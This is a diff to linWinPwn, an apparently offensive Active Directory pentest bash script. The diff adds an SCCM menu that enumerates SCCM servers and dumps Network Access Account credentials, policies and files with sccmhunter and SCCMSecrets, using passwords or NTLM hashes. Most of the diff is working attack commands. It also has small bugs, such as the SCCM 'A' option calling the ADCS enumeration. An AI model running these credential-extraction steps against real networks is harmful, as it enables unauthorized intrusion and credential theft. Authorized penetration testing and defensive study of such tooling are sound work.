@@ -131,6 +131,7 @@ ldapnomnom="$scripts_dir/ldapnomnom"
 godap="$scripts_dir/godap"
 mssqlpwner=$(which mssqlpwner)
 aesKrbKeyGen="$scripts_dir/aesKrbKeyGen.py"
+sccmsecrets="$scripts_dir/SCCMSecrets-master/SCCMSecrets.py"
 soapy=$(which soapy)
 nmap=$(which nmap)
 john=$(which john)
@@ -145,7 +146,7 @@ print_banner() {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 1.1.1 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 1.1.2 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -472,6 +473,7 @@ prepare() {
     Config_dir="${output_dir}/Config"
     Scans_dir="${output_dir}/Scans"
     ADCS_dir="${output_dir}/ADCS_${user_var}"
+    SCCM_dir="${output_dir}/SCCM"
     Modification_dir="${output_dir}/Modification_${user_var}"
     CommandExec_dir="${output_dir}/CommandExec_${user_var}"
     MSSQL_dir="${output_dir}/MSSQL_${user_var}"
@@ -629,6 +631,7 @@ authenticate() {
         argument_godap="-u '${user}'@${domain} -p '${password}'"
         argument_mssqlpwner="${domain}/'${user}':'${password}'"
         argument_soapy="${domain}/'${user}':'${password}'"
+        argument_secsccm="-u '${user}' -p '${password}'"
         hash_bool=false
         kerb_bool=false
         unset KRB5CCNAME
@@ -696,6 +699,7 @@ authenticate() {
             argument_godap="-u '${user}' -d ${domain} -H ${hash}"
             argument_mssqlpwner="-hashes ${hash} ${domain}/'${user}'"
             argument_soapy="--hash ${hash:33} ${domain}/'${user}'"
+            argument_secsccm="-u '${user}' -H '${hash}'"
         else
             echo -e "${RED}[i]${NC} Incorrect format of NTLM hash..."
             exit 1
@@ -1377,9 +1381,8 @@ ne_smb_enum() {
         run_command "${netexec} ${ne_verbose} smb ${target} -u ${rand_user} -p '' --users --log ${DomainRecon_dir}/ne_users_nullsess_smb_${dc_domain}.txt" 2>&1
         awk '!/\[-|\[+|\[\*/ && /SMB/ {gsub(/ +/, " "); split($12, arr, "\\"); print arr[2]}' "${DomainRecon_dir}/ne_users_nullsess_smb_${dc_domain}.txt" | grep -v "-Username-" >"${Users_dir}/users_list_ne_smb_nullsess_${dc_domain}.txt" 2>&1
     else
-        echo -e "${BLUE}[*] Users / Computers Enumeration (RPC authenticated)${NC}"
+        echo -e "${BLUE}[*] Users Enumeration (RPC authenticated)${NC}"
         run_command "${netexec} ${ne_verbose} smb ${target} ${argument_ne} --users-export ${Users_dir}/users_list_ne_smb_${dc_domain}.txt --log ${DomainRecon_dir}/ne_users_auth_smb_${dc_domain}.txt" 2>&1
-        run_command "${netexec} ${ne_verbose} smb ${target} ${argument_ne} --computers" >"${DomainRecon_dir}/ne_computers_auth_smb_${dc_domain}.txt"
     fi
     parse_users
     echo -e ""
@@ -1634,37 +1637,6 @@ rdwatool_enum() {
     else
         echo -e "${BLUE}[*] Enumerating RDWA servers using rdwatool${NC}"
         run_command "${rdwatool} recon -tf ${servers_hostname_list} -k" 2>&1 | tee "${DomainRecon_dir}/rdwatool_output_${dc_domain}.txt"
-    fi
-    echo -e ""
-}
-
-ne_sccm() {
-    echo -e "${BLUE}[*] SCCM Enumeration using netexec${NC}"
-    run_command "echo -n Y | ${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} -M sccm -o REC_RESOLVE=TRUE --log ${DomainRecon_dir}/ne_sccm_output_${dc_domain}.txt" 2>&1
-    echo -e ""
-}
-
-sccmhunter_enum() {
-    if [ ! -f "${sccmhunter}" ]; then
-        echo -e "${RED}[-] Please verify the installation of sccmhunter${NC}"
-    else
-        echo -e "${BLUE}[*] Enumeration of SCCM using sccmhunter${NC}"
-        if [ "${nullsess_bool}" == true ]; then
-            echo -e "${PURPLE}[-] sccmhunter requires credentials${NC}"
-        else
-            if [ "${ldaps_bool}" == true ]; then ldaps_param="-ldaps"; else ldaps_param=""; fi
-            /bin/rm -rf "$HOME/.sccmhunter/logs/" 2>/dev/null
-            run_command "${python3} ${sccmhunter} find ${argument_sccm} ${ldaps_param} -dc-ip ${dc_ip}" 2>&1 | tee -a "${DomainRecon_dir}/sccmhunter_output_${dc_domain}.txt"
-            run_command "${python3} ${sccmhunter} smb ${argument_sccm} ${ldaps_param} -dc-ip ${dc_ip} -save" 2>&1 | tee "${DomainRecon_dir}/sccmhunter_output_${dc_domain}.txt"
-            if ! grep -q 'SCCM doesn' "${DomainRecon_dir}/sccmhunter_output_${dc_domain}.txt" && ! grep -q 'Traceback' "${DomainRecon_dir}/sccmhunter_output_${dc_domain}.txt"; then
-                run_command "${python3} ${sccmhunter} show -users" 2>/dev/null | tee -a "${DomainRecon_dir}/sccmhunter_output_${dc_domain}.txt"
-                run_command "${python3} ${sccmhunter} show -computers" 2>/dev/null | tee -a "${DomainRecon_dir}/sccmhunter_output_${dc_domain}.txt"
-                run_command "${python3} ${sccmhunter} show -groups" 2>/dev/null | tee -a "${DomainRecon_dir}/sccmhunter_output_${dc_domain}.txt"
-                run_command "${python3} ${sccmhunter} show -mps" 2>/dev/null | tee -a "${DomainRecon_dir}/sccmhunter_output_${dc_domain}.txt"
-                echo -e "${GREEN}[+] SCCM server found! Follow steps below to add a new computer and extract the NAAConfig containing creds of Network Access Accounts:${NC}"
-                echo -e "${python3} ${sccmhunter} http ${argument_sccm} ${ldaps_param} -dc-ip ${dc_ip} -auto"
-            fi
-        fi
     fi
     echo -e ""
 }
@@ -2246,6 +2218,102 @@ certsync_ntds_dump() {
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-scheme ldap"; fi
             run_command "${certsync} ${argument_certsync} -dc-ip ${dc_ip} -dns-tcp -ns ${dc_ip} ${ldaps_param} -kdcHost ${dc_FQDN} -outputfile ${Credentials_dir}/certsync_${dc_domain}.txt"
+        fi
+    fi
+    echo -e ""
+}
+
+###### sccm: SCCM Enumeration
+ne_sccm() {
+    echo -e "${BLUE}[*] SCCM Enumeration using netexec${NC}"
+    run_command "echo -n Y | ${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} -M sccm -o REC_RESOLVE=TRUE --log ${SCCM_dir}/ne_sccm_output_${dc_domain}.txt" 2>&1
+    echo -e ""
+}
+
+sccmhunter_enum() {
+    if [ ! -f "${sccmhunter}" ]; then
+        echo -e "${RED}[-] Please verify the installation of sccmhunter${NC}"
+    else
+        echo -e "${BLUE}[*] Enumeration of SCCM using sccmhunter${NC}"
+        if [ "${nullsess_bool}" == true ]; then
+            echo -e "${PURPLE}[-] sccmhunter requires credentials${NC}"
+        else
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="-ldaps"; else ldaps_param=""; fi
+            /bin/rm -rf "$HOME/.sccmhunter/logs/" 2>/dev/null
+            run_command "${python3} ${sccmhunter} find ${argument_sccm} ${ldaps_param} -dc-ip ${dc_ip}" 2>&1 | tee -a "${SCCM_dir}/sccmhunter_output_${dc_domain}.txt"
+            run_command "${python3} ${sccmhunter} smb ${argument_sccm} ${ldaps_param} -dc-ip ${dc_ip} -save" 2>&1 | tee "${SCCM_dir}/sccmhunter_output_${dc_domain}.txt"
+            if ! grep -q 'SCCM doesn' "${SCCM_dir}/sccmhunter_output_${dc_domain}.txt" && ! grep -q 'Traceback' "${SCCM_dir}/sccmhunter_output_${dc_domain}.txt"; then
+                run_command "${python3} ${sccmhunter} show -users" 2>/dev/null | tee -a "${SCCM_dir}/sccmhunter_output_${dc_domain}.txt"
+                run_command "${python3} ${sccmhunter} show -computers" 2>/dev/null | tee -a "${SCCM_dir}/sccmhunter_output_${dc_domain}.txt"
+                run_command "${python3} ${sccmhunter} show -groups" 2>/dev/null | tee -a "${SCCM_dir}/sccmhunter_output_${dc_domain}.txt"
+                run_command "${python3} ${sccmhunter} show -mps" 2>/dev/null | tee -a "${SCCM_dir}/sccmhunter_output_${dc_domain}.txt"
+            fi
+        fi
+    fi
+    echo -e ""
+}
+
+sccmhunter_dump() {
+    if [ ! -f "${sccmhunter}" ]; then
+        echo -e "${RED}[-] Please verify the installation of sccmhunter${NC}"
+    else
+        echo -e "${BLUE}[*] Adding a new computer and extracting the NAAConfig containing creds of Network Access Accounts${NC}"
+        if [ "${nullsess_bool}" == true ]; then
+            echo -e "${PURPLE}[-] sccmhunter requires credentials${NC}"
+        else
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="-ldaps"; else ldaps_param=""; fi
+            if ! grep -q 'SCCM doesn' "${SCCM_dir}/sccmhunter_output_${dc_domain}.txt" && ! grep -q 'Traceback' "${SCCM_dir}/sccmhunter_output_${dc_domain}.txt"; then
+                echo -e "${GREEN}[+] SCCM server found!${NC}"
+                run_command "${python3} ${sccmhunter} http ${argument_sccm} ${ldaps_param} -dc-ip ${dc_ip} -auto" 2>/dev/null | tee -a "${SCCM_dir}/sccmhunter_dump_output_${dc_domain}.txt"
+            else
+                echo -e "${PURPLE}[-] No SCCM servers found! Please re-run SCCM enumeration using sccmhunter and try again..${NC}"
+            fi
+        fi
+    fi
+    echo -e ""
+}
+
+sccmsecrets_dump() {
+    if [ ! -f "${sccmsecrets}" ]; then
+        echo -e "${RED}[-] Please verify the installation of sccmsecrets${NC}"
+    else
+        echo -e "${BLUE}[*] Using SCCMSecrets to dump policies and files${NC}"
+        if [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
+            echo -e "${PURPLE}[-] SCCMSecrets does not support Kerberos authentication${NC}"
+        else
+            echo -e "${BLUE}[*] Please specify IP or hostname of SCCM server:${NC}"
+            echo -e "${CYAN}[*] Example: 10.1.0.8 or SCCM01 or SCCM01.domain.com ${NC}"
+            target_sccm=""
+            read -rp ">> " target_sccm </dev/tty
+            while [ "${target_sccm}" == "" ]; do
+                echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
+                read -rp ">> " target_sccm </dev/tty
+            done
+            current_dir=$(pwd)
+            cd "${SCCM_dir}" || exit
+            if [ "${nullsess_bool}" == true ]; then
+                run_command "${python3} ${sccmsecrets} policies -mp ${target_sccm} -cn WS3000"  2>/dev/null | tee -a "${SCCM_dir}/sccmsecrets_dump_output_${dc_domain}.txt"
+                run_command "${python3} ${sccmsecrets} files -dp ${target_sccm}" 2>/dev/null | tee -a "${SCCM_dir}/sccmsecrets_dump_output_${dc_domain}.txt"
+            else
+                echo -e "${BLUE}[*] Please specify computer used for authentication (example: WS3000$, default: current user):${NC}"
+                read -rp ">> " user_sccm </dev/tty
+                if [[ ! ${user_sccm} == "" ]]; then
+                    echo -e "${BLUE}[*] Please specify computer's password or NTLM hash:${NC}"
+                    read -rp ">> " pass_sccm </dev/tty
+                    while [ "${pass_sccm}" == "" ]; do
+                        echo -e "${RED}Invalid password/NTLM.${NC} Please specify password/NTLM:"
+                        read -rp ">> " pass_sccm </dev/tty
+                    done
+                    if [[ (${#pass_sccm} -eq 65 && "${pass_sccm:32:1}" == ":") || (${#pass_sccm} -eq 33 && "${pass_sccm:0:1}" == ":") || (${#pass_sccm} -eq 32) ]]; then
+                        argument_secsccm="-u '${user_sccm}' -H '${pass_sccm}'"
+                    else
+                        argument_secsccm="-u '${user_sccm}' -p '${pass_sccm}'"
+                    fi
+                fi
+                run_command "${python3} ${sccmsecrets} policies -mp ${target_sccm} ${argument_secsccm} -cn WS3001" 2>/dev/null | tee -a "${SCCM_dir}/sccmsecrets_dump_output_${dc_domain}.txt"
+                run_command "${python3} ${sccmsecrets} files -dp ${target_sccm} ${argument_secsccm}" 2>/dev/null | tee -a "${SCCM_dir}/sccmsecrets_dump_output_${dc_domain}.txt"
+            fi
+            cd "${current_dir}" || exit
         fi
     fi
     echo -e ""
@@ -4084,8 +4152,6 @@ ad_enum() {
         windapsearch_enum
         ldapwordharv_enum
         rdwatool_enum
-        ne_sccm
-        sccmhunter_enum
         GPOwned_enum
     fi
 }
@@ -4099,6 +4165,15 @@ adcs_enum() {
         certi_py_enum
         certipy_enum
         certifried_check
+    fi
+}
+
+sccm_enum()
+{
+    mkdir -p "${SCCM_dir}"
+    if [ "${nullsess_bool}" == false ]; then
+        ne_sccm
+        sccmhunter_enum
     fi
 }
 
@@ -4336,17 +4411,15 @@ ad_menu() {
     echo -e "17) Adalanche Enumeration"
     echo -e "18) GPO Enumeration using GPOwned"
     echo -e "19) Enumeration of RDWA servers"
-    echo -e "20) SCCM Enumeration using netexec"
-    echo -e "21) SCCM Enumeration using sccmhunter"
-    echo -e "22) Open p0dalirius' LDAP Console"
-    echo -e "23) Open p0dalirius' LDAP Monitor"
-    echo -e "24) Open garrettfoster13's ACED console"
-    echo -e "25) Open LDAPPER custom options"
-    echo -e "26) Open breads console"
-    echo -e "27) Run godap console"
-    echo -e "28) Run adPEAS enumerations"
-    echo -e "29) Run ADCheck enumerations"
-    echo -e "30) Run soapy enumerations"
+    echo -e "20) Open p0dalirius' LDAP Console"
+    echo -e "21) Open p0dalirius' LDAP Monitor"
+    echo -e "22) Open garrettfoster13's ACED console"
+    echo -e "23) Open LDAPPER custom options"
+    echo -e "24) Open breads console"
+    echo -e "25) Run godap console"
+    echo -e "26) Run adPEAS enumerations"
+    echo -e "27) Run ADCheck enumerations"
+    echo -e "28) Run soapy enumerations"
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
@@ -4464,56 +4537,46 @@ ad_menu() {
         ;;
 
     20)
-        ne_sccm
-        ad_menu
-        ;;
-
-    21)
-        sccmhunter_enum
-        ad_menu
-        ;;
-
-    22)
         ldap_console
         ad_menu
         ;;
 
-    23)
+    21)
         ldap_monitor
         ad_menu
         ;;
 
-    24)
+    22)
         aced_console
         ad_menu
         ;;
 
-    25)
+    23)
         ldapper_console
         ad_menu
         ;;
 
-    26)
+    24)
         breads_console
         ad_menu
         ;;
 
-    27)
+    25)
         godap_console
         ad_menu
         ;;
 
-    28)
+    26)
         adpeas_enum
         ad_menu
         ;;
 
-    29)
+    27)
         adcheck_enum
         ad_menu
         ;;
 
-    30)
+    28)
         soapy_enum
         ad_menu
         ;;
@@ -4615,6 +4678,63 @@ adcs_menu() {
         echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
         echo -e ""
         adcs_menu
+        ;;
+    esac
+}
+
+sccm_menu() {
+    mkdir -p "${SCCM_dir}"
+    echo -e ""
+    echo -e "${CYAN}[SCCM menu]${NC} Please choose from the following options:"
+    echo -e "-----------------------------------------------------"
+    echo -e "A) SCCM ENUMERATIONS #1,2"
+    echo -e "1) SCCM Enumeration using netexec"
+    echo -e "2) SCCM Enumeration using sccmhunter"
+    echo -e "3) SCCM NAA credentials dump using sccmhunter"
+    echo -e "4) SCCM Policies and Files dump using SCCMSecrets"
+    echo -e "back) Go back"
+    echo -e "exit) Exit"
+
+    read -rp "> " option_selected </dev/tty
+
+    case ${option_selected} in
+    A)
+        adcs_enum
+        sccm_menu
+        ;;
+
+    1)
+        ne_sccm
+        sccm_menu
+        ;;
+
+    2)
+        sccmhunter_enum
+        sccm_menu
+        ;;
+
+    3)
+        sccmhunter_dump
+        sccm_menu
+        ;;
+
+    4)
+        sccmsecrets_dump
+        sccm_menu
+        ;;
+
+    back)
+        main_menu
+        ;;
+
+    exit)
+        exit 1
+        ;;
+
+    *)
+        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
+        echo -e ""
+        sccm_menu
         ;;
     esac
 }
@@ -6216,6 +6336,8 @@ config_menu() {
         if [ ! -x "${godap}" ]; then echo -e "${RED}[-] godap is not executable${NC}"; else echo -e "${GREEN}[+] godap is executable${NC}"; fi
         if [ ! -f "${mssqlpwner}" ]; then echo -e "${RED}[-] mssqlpwner is not installed${NC}"; else echo -e "${GREEN}[+] mssqlpwner is installed${NC}"; fi
         if [ ! -f "${soapy}" ]; then echo -e "${RED}[-] soapy is not installed${NC}"; else echo -e "${GREEN}[+] soapy is installed${NC}"; fi
+        if [ ! -f "${sccmsecrets}" ]; then echo -e "${RED}[-] sccmsecrets is not installed${NC}"; else echo -e "${GREEN}[+] sccmsecrets is installed${NC}"; fi
+        if [ ! -x "${sccmsecrets}" ]; then echo -e "${RED}[-] godsccmsecretsap is not executable${NC}"; else echo -e "${GREEN}[+] sccmsecrets is executable${NC}"; fi
         config_menu
         ;;
 
@@ -6318,15 +6440,16 @@ main_menu() {
     echo -e "1) Run DNS Enumeration using adidnsdump"
     echo -e "2) Active Directory Enumeration Menu"
     echo -e "3) ADCS Enumeration Menu"
-    echo -e "4) Brute Force Attacks Menu"
-    echo -e "5) Kerberos Attacks Menu"
-    echo -e "6) SMB shares Enumeration Menu"
-    echo -e "7) Vulnerability Checks Menu"
-    echo -e "8) MSSQL Enumeration Menu"
-    echo -e "9) Password Dump Menu"
-    echo -e "10) AD Objects or Attributes Modification Menu"
-    echo -e "11) Command Execution Menu"
-    echo -e "12) Network Scan Menu"
+    echo -e "4) SCCM Enumeration Menu"
+    echo -e "5) Brute Force Attacks Menu"
+    echo -e "6) Kerberos Attacks Menu"
+    echo -e "7) SMB shares Enumeration Menu"
+    echo -e "8) Vulnerability Checks Menu"
+    echo -e "9) MSSQL Enumeration Menu"
+    echo -e "10) Password Dump Menu"
+    echo -e "11) AD Objects or Attributes Modification Menu"
+    echo -e "12) Command Execution Menu"
+    echo -e "13) Network Scan Menu"
     echo -e "back) Go back to Init Menu"
     echo -e "exit) Exit"
 
@@ -6349,38 +6472,42 @@ main_menu() {
         ;;
 
     4)
-        bruteforce_menu
+        sccm_menu
         ;;
 
     5)
-        kerberos_menu
+        bruteforce_menu
         ;;
 
     6)
-        shares_menu
+        kerberos_menu
         ;;
 
     7)
-        vulns_menu
+        shares_menu
         ;;
 
     8)
-        mssql_menu
+        vulns_menu
         ;;
 
     9)
-        pwd_menu
+        mssql_menu
         ;;
 
     10)
-        modif_menu
+        pwd_menu
         ;;
 
     11)
-        cmdexec_menu
+        modif_menu
         ;;
 
     12)
+        cmdexec_menu
+        ;;
+
+    13)
         netscan_menu
         ;;
 
@@ -6420,6 +6547,10 @@ main() {
         echo -e "${GREEN}---------------------------${NC}"
         echo -e ""
         adcs_enum
+        echo -e "${GREEN}[+] Start: SSCM Enumeration${NC}"
+        echo -e "${GREEN}---------------------------${NC}"
+        echo -e ""
+        sccm_enum
         echo -e "${GREEN}[+] Start: User and password Brute force Attacks${NC}"
         echo -e "${GREEN}------------------------------------------------${NC}"
         echo -e ""
